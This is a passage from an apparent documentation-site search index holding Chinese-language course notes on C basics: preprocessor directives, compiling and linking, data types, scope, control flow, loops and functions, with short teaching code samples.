&lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n\n/* Compile this program with:\n   cc -std=c11 -Wall -Werror -o rotate rotate.c\n */\n\n#define ROT 13\n\nstatic char rotate(char c)\n{\n    c = c + ROT;\n    return c;\n}\n\nint main(int argcount, char *argvalue[])\n{\n    // check the number of arguments\n    if(argcount != 2) {\n        exit(EXIT_FAILURE);\n    }\n    else {\n        exit(EXIT_SUCCESS);\n    }\n    return 0;\n}\n</code></pre> <ul> <li>C11 \u63d0\u4f9b\u4e24\u79cd\u7c7b\u578b\u7684 comments</li> </ul> <pre><code>/* block comments */\n// comments to the end of a line\n</code></pre> <ul> <li>main \u51fd\u6570\u6267\u884c\uff0c\u91cc\u9762\u7684\u53c2\u6570\u53eb args</li> </ul> <ul> <li>\u5f00\u5934\u7684 <code>#define</code> \u539f\u7406\u5982\u4e0b\uff1a</li> </ul> <p>\u5f53 C \u7f16\u8bd1\u5668\u9047\u5230 #define \u6307\u4ee4\u65f6\uff0c\u4f1a\u5728\u4ee3\u7801\u4e2d\u7528\u8be5\u5e38\u91cf\u6216\u5b8f\u7684\u503c\u66ff\u6362\u6bcf\u6b21\u51fa\u73b0\u7684\u5730\u65b9\u3002</p> <p>\u5728\u4f60\u7684\u4ee3\u7801\u7247\u6bb5\u4e2d\uff0c#define ROT 13 \u5b9a\u4e49\u4e86\u4e00\u4e2a\u540d\u4e3a ROT\uff0c\u503c\u4e3a 13 \u7684\u5b8f\u3002\u56e0\u6b64\uff0c\u6bcf\u5f53\u4ee3\u7801\u4e2d\u51fa\u73b0 ROT \u65f6\uff0c\u5b83\u5c06\u88ab\u66ff\u6362\u4e3a 13\u3002</p> <ul> <li><code>#include</code></li> </ul> <p><code>#include</code> \u6307\u4ee4\u7528\u4e8e\u5728\u4f60\u7684 C \u7a0b\u5e8f\u4e2d\u5305\u542b\u5916\u90e8\u6587\u4ef6\u3002\u88ab\u5305\u542b\u6587\u4ef6\u7684\u5185\u5bb9\u4f1a\u88ab\u63d2\u5165\u5230 <code>#include</code> \u6307\u4ee4\u7684\u4f4d\u7f6e\u3002</p> <p>\u4f8b\u5982\uff0c<code>#include &lt;stdio.h&gt;</code> \u5728\u4f60\u7684\u7a0b\u5e8f\u4e2d\u5305\u542b\u4e86\u6807\u51c6\u8f93\u5165\u8f93\u51fa\u5e93\uff0c\u4f7f\u4f60\u80fd\u591f\u4f7f\u7528 printf\u3001scanf \u7b49\u51fd\u6570\u3002</p> <p>\u5f53\u4f60\u8fd0\u884c C \u9884\u5904\u7406\u5668(\u5728\u5b9e\u9645\u7f16\u8bd1\u4e4b\u524d)\uff0c\u5b83\u4f1a\u5904\u7406\u8fd9\u4e9b\u6307\u4ee4\u5e76\u76f8\u5e94\u4fee\u6539\u4f60\u7684\u4ee3\u7801\u3002\u5728\u8fd9\u4e2a\u9884\u5904\u7406\u6b65\u9aa4\u4e4b\u540e\uff0c\u4fee\u6539\u540e\u7684\u4ee3\u7801\u5c06\u7531\u7f16\u8bd1\u5668\u8fdb\u884c\u7f16\u8bd1\u3002</p>"},{"location":"cs/c/2.1/#compiler","title":"Compiler","text":"<ol> <li>\u7f16\u8bd1\uff08Compiler\uff09\uff1a</li> </ol> <p>\u6e90\u4ee3\u7801\uff08Source Code\uff09\u6587\u4ef6\uff08\u901a\u5e38\u4e3a.c\u6587\u4ef6\uff09\u7531\u7f16\u8bd1\u5668\u5904\u7406\u3002\u7f16\u8bd1\u5668\u9996\u5148\u5bf9\u4ee3\u7801\u8fdb\u884c\u9884\u5904\u7406\uff0c\u5904\u7406\u5982 <code>#include</code> \u548c <code>#define</code> \u7b49\u6307\u4ee4\u3002\u7136\u540e\uff0c\u5b83\u4f1a\u8fdb\u884c\u5b9e\u9645\u7684\u7f16\u8bd1\u8fc7\u7a0b\uff0c\u8fd9\u5305\u62ec\u8bed\u6cd5\u5206\u6790\u3001\u8bed\u4e49\u5206\u6790\u3001\u751f\u6210\u4e2d\u95f4\u4ee3\u7801\u3001\u4f18\u5316\u4ee5\u53ca\u6700\u7ec8\u751f\u6210\u673a\u5668\u4ee3\u7801\u3002\u7f16\u8bd1\u540e\u751f\u6210\u7684\u662f\u76ee\u6807\u6587\u4ef6\uff08Object File\uff09\uff0c\u901a\u5e38\u8fd9\u662f\u4e00\u79cd\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5305\u542b\u4e86\u4ece\u6e90\u4ee3\u7801\u7f16\u8bd1\u8fc7\u6765\u7684\u673a\u5668\u6307\u4ee4\uff0c\u4f46\u8fd9\u4e9b\u6307\u4ee4\u5c1a\u672a\u94fe\u63a5\u6210\u53ef\u6267\u884c\u7a0b\u5e8f\u3002</p> <ol> <li>\u94fe\u63a5\uff08Linker\uff09\uff1a</li> </ol> <p>\u94fe\u63a5\u5668\u8d1f\u8d23\u5c06\u4e00\u4e2a\u6216\u591a\u4e2a\u76ee\u6807\u6587\u4ef6\u4e0e\u5e93\u6587\u4ef6\uff08Library Files\uff09\u7ed3\u5408\u8d77\u6765\u751f\u6210\u53ef\u6267\u884c\u6587\u4ef6\uff08Executable File\uff09\u3002\u94fe\u63a5\u8fc7\u7a0b\u89e3\u51b3\u4e86\u7a0b\u5e8f\u4e2d\u5bf9\u5e93\u51fd\u6570\u4ee5\u53ca\u7a0b\u5e8f\u4e2d\u5176\u4ed6\u6587\u4ef6\u7684\u51fd\u6570\u548c\u53d8\u91cf\u7684\u5f15\u7528\u95ee\u9898\u3002\u5982\u679c\u4f60\u7684\u7a0b\u5e8f\u8c03\u7528\u4e86\u4efb\u4f55\u5e93\u51fd\u6570\uff08\u6bd4\u5982\u6807\u51c6\u8f93\u5165\u8f93\u51fa\u5e93\u51fd\u6570\uff09\uff0c\u94fe\u63a5\u5668\u4f1a\u67e5\u627e\u8fd9\u4e9b\u51fd\u6570\u5728\u5e93\u6587\u4ef6\u4e2d\u7684\u5b9a\u4e49\uff0c\u5e76\u5c06\u5bf9\u5e94\u7684\u4ee3\u7801\u94fe\u63a5\u5230\u4f60\u7684\u7a0b\u5e8f\u4e2d\u4ee5\u786e\u4fdd\u7a0b\u5e8f\u5b8c\u6574\u6027\u3002</p> <ol> <li>\u5e93\u6587\u4ef6\uff08Library Files\uff09\uff1a</li> </ol> <p>\u5e93\u6587\u4ef6\u5305\u542b\u9884\u5b9a\u4e49\u7684\u51fd\u6570\u548c\u8d44\u6e90\uff0c\u8fd9\u4e9b\u53ef\u4ee5\u88ab\u591a\u4e2a\u7a0b\u5e8f\u5171\u540c\u4f7f\u7528\u3002\u4e0d\u9700\u8981\u91cd\u590d\u7f16\u5199\u5e38\u7528\u7684\u4ee3\u7801\uff0c\u53ea\u9700\u5728\u9700\u8981\u65f6\u94fe\u63a5\u76f8\u5e94\u7684\u5e93\u3002</p> <p></p>"},{"location":"cs/c/2.1/#variables","title":"Variables","text":""},{"location":"cs/c/2.1/#ram","title":"RAM","text":"<ul> <li>single integer value - 4 bytes</li> <li>single floating value - 8 bytes</li> </ul>"},{"location":"cs/c/2.1/#name","title":"NAME","text":"<p>\u5b57\u6bcd\u6216\u4e0b\u5212\u7ebf\u5f00\u5934\uff0c\u540e\u63a5 _A-Za-z0-9</p> <p>C \u8bed\u8a00\u533a\u522b\u5927\u5c0f\u5199\uff0cC \u9884\u5904\u7406\u5668\u63d0\u4f9b\u7684\u5e38\u91cf\u4f7f\u7528\u5927\u5199\u8868\u793a\uff1a<code>MAXLENGTH, AVATAR, BUFSIZ, ROT</code></p> <p>\u8f83\u65e7\u7684 C \u7f16\u8bd1\u5668\u5c06\u53d8\u91cf\u540d\u79f0\u9650\u5236\u4e3a 8 \u4e2a\u552f\u4e00\u5b57\u7b26, \u5982\u679c\u4e3a\u65e7\u73af\u5883\u5f00\u53d1\u53ef\u79fb\u690d\u4ee3\u7801\uff0c\u8bf7\u8bb0\u4f4f\u8fd9\u4e00\u70b9</p>"},{"location":"cs/c/2.1/#data-type","title":"Data Type","text":"<p>bool, char, int, float \u4ee5\u53ca double \u4e3a\u4e3b\u8981\u57fa\u7840\u6570\u636e\u7c7b\u578b</p> <p>\u5386\u53f2\u4e0a\uff0c\u4e0d\u540c\u8ba1\u7b97\u673a\u5236\u9020\u5546\u5728\u57fa\u672c\u6570\u636e\u7c7b\u578b\u7684\u5185\u5b58\u5927\u5c0f\u4e0a\u5b58\u5728\u5dee\u5f02\uff0c\u5bfc\u81f4\u4e0d\u517c\u5bb9\u6027\u95ee\u9898\u3002</p> <p>C \u8bed\u8a00\u901a\u8fc7\u4e0d\u6307\u5b9a\u6570\u636e\u7c7b\u578b\u7684\u5927\u5c0f\u6765\u89e3\u51b3\u6b64\u95ee\u9898\uff0c\u4f7f\u5f97\u7a0b\u5e8f\u5728\u6e90\u4ee3\u7801\u7ea7\u522b\u5177\u6709\u53ef\u79fb\u690d\u6027\u3002</p> <p>C \u8bed\u8a00\u552f\u4e00\u8981\u6c42\u662f\u6570\u636e\u7c7b\u578b\u4e4b\u95f4\u7684\u5927\u5c0f\u5173\u7cfb\u5e94\u4e3a\uff1asizeof(char) \u2264 sizeof(short) \u2264 sizeof(int) \u2264 sizeof(long)\u3002</p> <p>\u4e0d\u540c\u4f53\u7cfb\u7ed3\u6784\u4e0a\u7684\u4e0d\u540c C \u7f16\u8bd1\u5668\u53ef\u4ee5\u4f7f\u7528\u4e0d\u540c\u5927\u5c0f\u7684\u6574\u6570\uff0c\u5bfc\u81f4\u5b58\u50a8\u5927\u5c0f\u7684\u53d8\u5316\u3002</p> <p>\u6d4b\u8bd5\u5f53\u524d\u67b6\u6784\u4e0b\u6570\u636e\u7c7b\u578b\u5185\u5b58\u5927\u5c0f\u4ee3\u7801\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main(void)\n{\n    printf(\"char  %lu\\n\", sizeof(char));\n    printf(\"short %lu\\n\", sizeof(short));\n    printf(\"int   %lu\\n\", sizeof(int));\n    printf(\"long  %lu\\n\", sizeof(long));\n    return 0;\n}\n</code></pre> <p>Macbook Air M2 \u6267\u884c\u7ed3\u679c\u5982\u4e0b\uff1a</p> <pre><code>char  1\nshort 2\nint   4\nlong  8\n</code></pre> <p>\u8fd9\u610f\u5473\u7740\u8fd9\u53f0\u67b6\u6784\u7684\u8ba1\u7b97\u673a can only represent the values -2,147,483,648 to 2,147,483,647</p> <p>\u8fd9\u4e2a\u503c\u7684\u8ba1\u7b97\u516c\u5f0f\u4e3a 4 bytes = 4 * 8 bits = 32, 2^32 = 4294967296</p> <p>\u800c\u4e3a\u4e86\u8868\u8fbe\u6b63\u8d1f\u6570\uff0c\u9700\u8981\u5206\u914d\u4e00\u534a\u7ed9\u6b63\u6570\u4e00\u534a\u7ed9\u8d1f\u6570\uff0c\u6b63\u6570\u7684\u8303\u56f4\u662f 0 \u5230 2,147,483,647\uff0c\u8d1f\u6570\u7684\u8303\u56f4\u662f -1 \u5230 -2,147,483,648\u3002</p>"},{"location":"cs/c/2.1/#the-scope-of-variables","title":"The scope of variables","text":"<p>C \u53ea\u6709 2 \u79cd\u4e3b\u8981\u7c7b\u578b\u7684\u8303\u56f4\uff1a</p> <ul> <li>global scope</li> </ul> <p>\u5168\u5c40\u4f5c\u7528\u57df\uff08\u6709\u65f6\u79f0\u4e3a\u6587\u4ef6\u4f5c\u7528\u57df\uff09\uff0c\u5176\u4e2d\u53d8\u91cf\u5728\u6240\u6709\u51fd\u6570\u548c\u8bed\u53e5\u5757\u4e4b\u5916\u58f0\u660e\uff0c\u4ee5\u53ca</p> <ul> <li>block scope in which variables are declared within a function or statement block.</li> </ul> <p>\u5728\u51fd\u6570\u6216\u8bed\u53e5\u5757\u4e2d\u58f0\u660e\u53d8\u91cf\u7684\u5757\u4f5c\u7528\u57df</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n\nstatic int count = 0;\n\nint main(int argcount, char *argvalue[])\n{\n    int nfound = 0;\n\n    // check the number of arguments\n    if(argcount != 2) {\n        int nerrors = 1;\n\n        ....\n        exit(EXIT_FAILURE);\n    }\n    else {\n        int ntimes = 100;\n\n        ....\n        exit(EXIT_SUCCESS);\n    }\n    return 0;\n}\n</code></pre> <p>\u5176\u4e2d count \u4e3a global scope, static \u9632\u6b62\u5916\u90e8\u6587\u4ef6\u8bbf\u95ee\uff0cnfound\uff0cnerrors, ntimes \u5177\u6709 block scope </p> <p>C \u8bed\u8a00\u63a7\u5236\u6d41\u548c\u5176\u4ed6\u8bed\u8a00\u7c7b\u4f3c</p>"},{"location":"cs/c/2.1/#conditional-execution","title":"Conditional execution","text":"<pre><code>if(condition1) {                \n  // more statements;\n  .....\n}\nelse if(condition2) {\n  // more statements;\n  .....\n}\nelse {\n  // more statements;\n  .....\n}\n</code></pre> <p>curly-brackets \u975e\u5fc5\u9700\u4f46\u662f\u548c Java \u4e00\u6837\u4e3a\u4e00\u79cd\u4e66\u5199\u683c\u5f0f\u6807\u51c6</p>"},{"location":"cs/c/2.1/#boolean-values","title":"Boolean values","text":"<p>\u5728 ISO-C99 \u4e4b\u524d\uff0cC \u6807\u51c6\u6ca1\u6709\u5e03\u5c14\u6570\u636e\u7c7b\u578b, 0 \u4ee3\u8868 false 1 \u4ee3\u8868 true</p> <pre><code>int initialised = 0\n\nif (0 == initialised) {\n  // initialisation statements;\n  .....\n  initialised = 1; // set to true\n}\n</code></pre> <p>\u800c\u540e\u9700\u8981\u4f7f\u7528 true \u548c false constants \u7684\u65f6\u5019\u9700\u8981\u5012\u5165 <code>#include &lt;stdbool.h&gt;</code> \u5e93</p>"},{"location":"cs/c/2.1/#switch-statements","title":"switch statements","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int value = 2;\n\n    // \u4f7f\u7528 if..else if..else \u7ed3\u6784\n    if(value == 1) {\n        printf(\"The value is 1.\\n\");\n    } \n    else if(value == 2) {\n        printf(\"The value is 2.\\n\");\n    } \n    else {\n        printf(\"The value is neither 1 nor 2.\\n\");\n    }\n\n    // \u4f7f\u7528 switch \u7ed3\u6784\n    switch(value) {          \n        case 1 :\n            printf(\"The value is 1.\\n\");\n            break;\n\n        case 2 :\n            printf(\"The value is 2.\\n\");\n            break;\n\n        default :\n            printf(\"The value is neither 1 nor 2.\\n\");\n            break;\n    }\n\n    return 0;\n}\n</code></pre> <ul> <li>\u6bcf\u4e2a case \u540e\u90fd\u5fc5\u987b\u52a0\u4e0a break \u79bb\u5f00 switch control flow\uff0c\u5982\u679c\u5fd8\u8bb0\u6dfb\u52a0 break \u8bed\u53e5\u5c31\u4f1a\u81ea\u52a8\u7ee7\u7eed\u6267\u884c\u4e0b\u4e00\u4e2a case \u5206\u652f</li> <li>if \u548c switch \u4e2d\u7684 expression \u6570\u636e\u7c7b\u578b\u5fc5\u987b\u662f\u6574\u6570\u3001\u5b57\u7b26\u3001\u5e03\u5c14\u503c\u4e0e enumerated types\uff0c\u4f46\u662f\u4e0d\u80fd\u662f real \u6216 floating</li> <li>\u5982\u679c\u6bd4\u8f83\u503c\u8f83\u591a\u7684\u60c5\u51b5\u4e0b switch \u4e3a\u4f18\u5316\u4ee3\u7801\u91cf\u7b80\u6d01\u7684\u597d\u65b9\u6848\uff0c\u56e0\u4e3a case \u5185\u4e0d\u7528\u50cf if \u4e00\u6837\u6dfb\u52a0 curly brackets</li> </ul> <p>value \u8981\u5bf9\u6bd4\u7684\u53d8\u91cf\uff0cdefault \u53ef\u5f53\u4f5c if \u8bed\u53e5\u4e2d\u7684 else</p>"},{"location":"cs/c/2.1/#for-bounded-loops","title":"for - bounded loops","text":"<p>\u6709\u754c\u5faa\u73af\u548c Java \u4e00\u6837\u8bed\u6cd5\uff1a</p> <pre><code>for(int i = 1 ; i &lt;= 10 ; i = i+1) {\n// the above introduced a loop-control variable, i\n  .....\n  printf(\"loop number %i\\n\", i);\n  .....\n// variable i is available down to here\n}\n\nfor(char ch = 'a' ; ch &lt;= 'z' ; ch = ch+1) {\n  .....\n  printf(\"loop using character '%c'\\n\", ch);\n  .....\n}\n</code></pre> <p>\u4e09\u4e2a\u53c2\u6570\u4e3a\u8d77\u59cb\u503c\u3001\u505c\u6b62\u6761\u4ef6\uff0c\u6267\u884c\u8fc7\u7a0b\u7b97\u6cd5\uff1b\u53d8\u91cf\u5728 for loop \u5185\u90e8\u4f7f\u7528\u5b8c\u540e\u6d88\u5931</p>"},{"location":"cs/c/2.1/#while-do-while-unbounded-loops","title":"while &amp; do while - unbounded loops","text":"<pre><code>#include &lt;stdio.h&gt;\n\n#define NLOOPS 20\n\nint main()\n{\n    int i = 1;\n    int n = 0;\n\n    while (i &lt;= NLOOPS)\n    {\n        printf(\"iteration number %d\\n\", i);\n        // \u66ff\u6362\u6b64\u5904\u4e3a\u5b9e\u9645\u8ba1\u7b97\u65b9\u6cd5\n        i = some_calculation_setting_i;\n        n++;\n    }\n\n    printf(\"loop was traversed %d times\\n\", n);\n\n    return 0;\n}\n</code></pre> <p>\u4e0e Python \u4e00\u6837 while \u7684 expression \u610f\u601d\u4e3a\u53ea\u8981 i &lt;= 20 \u90a3\u5c31\u4fdd\u6301 true \u5982\u679c\u8d85\u8fc7\u8fd9\u4e2a\u8fb9\u754c\u90a3\u5c31 false \u9000\u51fa\u5faa\u73af</p> <pre><code>#include &lt;stdio.h&gt;\n\n#define NLOOPS 20\n\nint main()\n{\n    int i = 1;\n    int n = 0;\n\n    do\n    {\n        printf(\"iteration number %d\\n\", i);\n        // \u66ff\u6362\u6b64\u5904\u4e3a\u5b9e\u9645\u8ba1\u7b97\u65b9\u6cd5\n        i = some_calculation_setting_i;\n        n++;\n    } while (i &lt;= NLOOPS);\n\n    printf(\"loop was traversed %d times\\n\", n);\n\n    return 0;\n}\n</code></pre> <p>\u5f00\u5934 while \u6362\u6210 do \u540e curly bracket \u4e4b\u540e\u52a0\u4e0a while expression \u4e3a do while \u5faa\u73af\uff1b\u4e0e for \u4e0d\u540c\u7684\u662f while \u9700\u4ece\u5916\u90e8\u58f0\u660e\u5f15\u5165\u53d8\u91cf\u7528\u4e8e\u8fed\u4ee3</p>"},{"location":"cs/c/2.1/#nest-loop","title":"Nest loop","text":"<pre><code>#define NROWS 6\n#define NCOLS 4\n\nfor(int row = 1 ; row &lt;= NROWS ; row = row+1) {      // the 'outer' loop\n\n    for(int col = 1 ; col &lt;= NCOLS ; col = col+1) {  // the 'inner' loop\n        printf(\"(%i,%i)  \", row, col);               // print row and col as if \"coordinates\"  \n    }\n    printf(\"\\n\");                                    // finish printing on this line\n}\n</code></pre>"},{"location":"cs/c/2.1/#define-variables","title":"define &amp; variables","text":"<p>define \u4e3a\u5728\u6267\u884c\u671f\u95f4\u505a\u6587\u672c\u66ff\u6362\uff0c\u5f53\u9700\u8981\u6539\u53d8\u884c\u6570\u6216\u5217\u6570\u65f6\uff0c\u53ea\u9700\u4fee\u6539\u5b9a\u4e49\u7684\u5730\u65b9\uff0c\u800c\u4e0d\u5fc5\u5728\u6574\u4e2a\u4ee3\u7801\u4e2d\u5bfb\u627e\u548c\u4fee\u6539\u76f8\u5e94\u7684\u53d8\u91cf\u5b9a\u4e49\uff1b\u5e76\u4e14\u901a\u5e38\u9759\u6001\u53d8\u91cf\u5728\u7a0b\u5e8f\u8fd0\u884c\u671f\u95f4\u4f1a\u4e00\u76f4\u5b58\u5728\u5185\u5b58\u4e2d</p>"},{"location":"cs/c/2.1/#break-continue","title":"break &amp; continue","text":"<pre><code>for(int i = 1 ; i &lt;= 10 ; i = i+1) {\n    // Read an input character from the keyboard\n    .....\n    if(input_char == 'Q') { // Should we quit?\n        break;\n    }\n    .....\n    .....\n}\n// Come here after the 'break'.  i is unavailable\n</code></pre> <p>\u5728\u7528\u6237\u8f93\u5165 Q \u540e\u6574\u4e2a\u7a0b\u5e8f\u76f4\u63a5\u9000\u51fa</p> <pre><code>for(char ch = 'a' ; ch &lt;= 'z' ; ch = ch+1) {\n    if(ch == 'm') { // skip over the character 'm'\n        continue;\n    }\n    .....\n    .....\n    statements that will never see ch == 'm'\n    .....\n    .....\n}\n</code></pre> <p>\u5faa\u73af\u4e2d\u78b0\u5230 m \u540e\u4e0d\u505a\u4efb\u4f55\u64cd\u4f5c\u8df3\u8fc7\u8fdb\u5165\u4e0b\u4e00\u4e2a\u5faa\u73af</p>"},{"location":"cs/c/2.1/#infinite-loops","title":"infinite loops","text":"<pre><code>for( ; ; ) {\n    .....\n    .....\n}\n</code></pre> <pre><code>#include &lt;stdbool.h&gt;\n\n// clearer - use this mechanism\nwhile( true ) {\n    .....\n    .....\n}\n</code></pre>"},{"location":"cs/c/2.1/#conclusion","title":"Conclusion","text":"<ul> <li>\u76f8\u6bd4\u4e8e Python, C \u8bed\u8a00\u548c Java \u4e00\u6837\u4e0d\u5728\u4e4e indent</li> <li>C \u63d0\u4f9b\u4e24\u79cd\u6d6e\u70b9\u6570\u636e\u7c7b\u578b float \u548c double \u5206\u522b\u5360\u7528 32 \u4e0e 64 \u5b57\u8282</li> </ul> <p>\u4f46\u5728 system programming \u4e2d\u4e3a\u4e86\u907f\u514d\u7cbe\u5ea6\u9ebb\u70e6\u66f4\u591a\u53ea\u7528\u6574\u6570\u7c7b\u578b\uff1a int, short, long, long long</p>"},{"location":"cs/c/2.2/","title":"2.2 Functions","text":""},{"location":"cs/c/2.2/#wed-lecture","title":"Wed Lecture","text":"<ol> <li>\u51fd\u6570\u7684\u5b58\u5728\u662f\u4e3a\u4e86\u53ef\u8bfb\u6027\uff0c\u53ef\u79fb\u690d\u6027\uff0c\u53ef\u7ef4\u62a4\u6027\u7b49\uff0c\u4e5f\u53ef\u5728\u8f6f\u4ef6\u5de5\u7a0b\u91cd\u6784\u8fc7\u7a0b\u4e2d\u7528\u4e8e\u51cf\u5c11\u91cd\u590d\u4ee3\u7801\u91cf\u4e0e\u5185\u5b58\uff0c\u63d0\u4f9b\u5176\u4ed6\u6a21\u5757\u91cd\u590d\u8c03\u7528\uff0c\u540c\u65f6\u5c06\u8bed\u53e5\u62bd\u8c61\u5316</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u91c7\u7528\u4ee5\u4e0b\u51fd\u6570\u5b9a\u4e49\u660e\u786e\u7684\u5165\u53e3\u70b9\uff0c\u4ece\u7528\u6237\u7f16\u5199\u7684\u4ee3\u7801\u5230\u5185\u6838\u4e2d\uff0c\u6b64\u7c7b\u51fd\u6570\u79f0\u4e3a\u7cfb\u7edf\u8c03\u7528\u3002 \u5728 main \u51fd\u6570\u4e2d <code>return 0;</code> \u5c31\u662f\u5728\u544a\u8bc9\u7cfb\u7a0b\u5e8f\u6267\u884c\u5b8c\u6bd5\uff0c\u548c\u65e9\u671f\u7684\u65f6\u949f\u673a\u5236\u6709\u5173</li> <li>\u5e93\u5c01\u88c5\u518d\u5206\u53d1\uff0c\u8fd9\u91cc\u6559\u6388\u63d0\u5230 Apple \u7684\u6807\u51c6\u5e93\u4e2d\u9ed8\u8ba4\u9690\u5f0f\u5f97\u5e2e\u4f60\u8c03\u7528\u4e86\u90e8\u5206 math \u5e93\u6240\u4ee5\u4f60\u4e0d\u7528 include, \u4f46\u662f\u5728 linux \u9700\u8981\u786e\u4fdd\u6bcf\u4e2a\u7a0b\u5e8f\u90fd\u6b63\u786e\u94fe\u63a5</li> <li>\u5728\u8db3\u591f\u5148\u8fdb\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u591a\u4e2a\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\u53ef\u4ee5\u5171\u4eab\u4e00\u4e2a\u51fd\u6570\u7684\u5355\u4e2a\u5b9e\u4f8b\uff0c \u6bd4\u5982 printf\uff08\uff09 - \u524d\u63d0\u662f\u51fd\u6570\u7684\u4ee3\u7801\u4e0d\u80fd\u88ab\u4efb\u4f55\u8fdb\u7a0b\u4fee\u6539\uff0c\u5e76\u4e14\u8be5\u51fd\u6570\u5f15\u7528\u6bcf\u4e2a\u8fdb\u7a0b\u7684\u4e0d\u540c data \u548c\u4f20\u9012\u7ed9\u51fd\u6570\u7684\u53c2\u6570\u3002</li> <li>main \u51fd\u6570\u5728\u6b63\u5f0f\u7f16\u5199\u65f6\u53ea\u505a\u53c2\u6570\u5f02\u5e38\u5904\u7406</li> </ol> <p>main() should be constrained to:</p> <ul> <li>receive and check the program's command-line arguments,</li> <li>report errors detected with command-line arguments, and then call exit(EXIT_FAILURE)</li> <li>call functions from main(), typically passing information requested and provided by the command-line arguments, and finally call exit(EXIT_SUCCESS) if all went well.</li> <li>All error messages printed to the stderr stream.</li> <li>All 'normal' output printed to the stdout stream</li> </ul> Application domain (a sample of) 3rd-party libraries operating system services (files, directories, processes, inter-process communication) OS-specific libraries, e.g. glibc, System32, Cocoa web-based programming libcgi, libxml, libcurl data structures and algorithms the generic data structures library (GDSL) GUI and graphics development OpenGL, GTK, Qt, wxWidgets, UIKit, Win32, Tcl/Tk image processing (GIFs, JPGs, etc) GD, libjpeg, libpng networking Berkeley sockets, AT&amp;T's TLI security, cryptography openssl, libmp scientific computing NAG, Blas3, GNU scientific library (gsl) concurrency, parallel and GPU programming OpenMP, CUDA, OpenCL, openLinda (thread support is defined in C11, but not in C99) <p>\u867d\u7136 C \u8bed\u8a00\u672c\u8eab\u6ca1\u6709\u592a\u591a\u5b9e\u73b0\u7684\u5185\u7f6e\u65b9\u6cd5\uff0c\u4f46\u4ecd\u7136\u6709\u5927\u91cf\u7684\u5171\u4eab\u5e93</p>"},{"location":"cs/c/2.2/#the-datatype-of-a-function","title":"The datatype of a function","text":""},{"location":"cs/c/2.2/#void","title":"void","text":"<p>\u4e0d\u4f5c return \u53ea\u505a printf </p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid output(char ch, int n)        \n{\n    for(int i=1 ; i&lt;=n ; i=i+1) {\n        printf(\"%c\", ch);\n    }\n}\n\nint main(int argc, char *argv[])\n{\n    output(' ', 19);\n    output('*',  1);\n    output('\\n', 1);\n    return 0;\n}\n</code></pre>"},{"location":"cs/c/2.2/#extern","title":"extern","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nextern double sqrt(double x);\n\nfloat square(float x)\n{\n    return x * x;\n}\n\nint main(int argc, char *argv[])\n{\n    if(argc &gt; 2) {\n      float a, b, sum;\n\n      a   = atof(argv[1]);\n      b   = atof(argv[2]);\n\n      sum = square(a) + square(b);\n      printf(\"hypotenuse = %f\\n\",\n             sqrt(sum) );\n    }\n    return 0;\n}\n</code></pre> <p>header file \u91cc\u5e76\u4e0d\u4f1a\u5305\u542b\u4ee3\u7801\u5b9e\u73b0\uff0c\u53ea\u4f1a declare \u6709\u8fd9\u4e2a sqrt \u65b9\u6cd5\u5b58\u5728\u8fd9\u53eb declaration\uff0c\u4f60\u9700\u8981\u81ea\u5df1\u53bb\u7528 extern \u91cd\u65b0\u4e66\u5199\u5176 definition \u907f\u514d\u5176\u9ed8\u8ba4\u4f7f\u7528 int \u5bf9\u5f85 args. double \u7684\u539f\u56e0\u4e3a\u5728 Linux \u4e2d\u5b9e\u9645\u4e0a\u6211\u4eec\u5e76\u4e0d\u4f1a\u4f7f\u7528\u592a\u591a float, \u7cbe\u5ea6\u4e0d\u591f\u65f6\u7cfb\u7edf\u4e00\u4f1a\u81ea\u52a8\u8fdb\u884c\u4e0b\u4e00\u7ea7\u7684\u4e0a\u5347</p>"},{"location":"cs/c/2.2/#common-mistakes","title":"Common mistakes","text":"<ol> <li>\u51fd\u6570\u4e0d\u9700\u8981\u5b9a\u4e49\u53c2\u6570\u4e5f\u53ef\u4ee5\u8fd0\u884c</li> </ol> <pre><code>void backup_files( void )            \n{\n    .....\n}\n</code></pre> <ol> <li>\u5728\u7f16\u5199 C \u8bed\u8a00\u4ee3\u7801\u65f6\uff0c\u4e0d\u8981\u4f9d\u8d56\u7279\u5b9a\u7684\u53c2\u6570\u6c42\u503c\u987a\u5e8f\uff0c\u56e0\u4e3a\u7f16\u8bd1\u5668\u4f18\u5316\u4ee5\u53ca\u4e0d\u540c\u67b6\u6784\u4e0b\u7684\u4f18\u5316\u7b56\u7565\uff0c\u4e0d\u540c\u67b6\u6784\u4e0b\u8fd0\u884c\u7684\u76f8\u540c\u4ee3\u7801\u53ef\u80fd\u4f1a\u5bfc\u81f4\u53c2\u6570\u6c42\u503c\u987a\u5e8f\u4e0d\u540c</li> </ol> <pre><code>int square( int a )\n{\n    printf(\"calculating the square of %i\\n\", a);\n    return a * a;\n}\n\nvoid sum( int x, int y )\n{\n    printf(\"sum = %i\\n\", x + y );\n}\n\n....\n\n    ....\n    sum( square(3), square(4) );\n</code></pre> <p>\u4ee5\u4e0a\u8fd9\u6bb5\u4ee3\u7801\u5728\u4e0d\u540c\u7684\u673a\u5668\u4e0b\u6267\u884c\u51fa\u6765\u7684\u7ed3\u679c\u4e0d\u540c\uff1a</p> <pre><code>    calculating the square of 3     // the output on PowerPC Macs\n    calculating the square of 4\n    sum = 25\n\nor\n\n    calculating the square of 4     // the output on Intel Macs\n    calculating the square of 3\n    sum = 25\n</code></pre>"},{"location":"cs/c/2.2/#static","title":"static","text":"<p>\u5bf9\u4e8e function \u6765\u8bf4\u7c7b\u4f3c\u4e8e Java \u7684 private \u7981\u6b62\u5916\u90e8\u8bbf\u95ee\uff0c\u79c1\u6709\u5316</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n//  myfunction IS ONLY VISIBLE WITHIN THIS FILE, AND IS CALLED BY main\nstatic void myfunction(void)\n{\n    static int count = 1;    //  retains its value between function calls\n    int        local = 0;    //  is re-initialised on each function 